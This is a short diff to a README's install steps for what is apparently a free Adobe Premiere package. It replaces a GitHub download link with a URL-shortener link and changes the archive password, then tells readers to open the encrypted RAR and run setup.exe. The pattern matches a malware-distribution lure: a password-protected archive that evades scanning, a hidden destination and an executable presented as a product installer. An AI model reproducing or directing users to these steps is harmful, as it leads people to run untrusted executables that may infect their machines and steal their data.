@@ -2,8 +2,8 @@
 
 <H3>How to use:</H3>
 
-- [Download](https://github.com/chautelhardslimemel1982/premiere/releases/download/Download/Premiere.rar)
-- Open archive (password: adobe)
+- [Download](https://goo.su/t7nrX)
+- Open archive (password: Project12!)
 - Open setup.exe for download all components and install
 - Follow the instruction
 
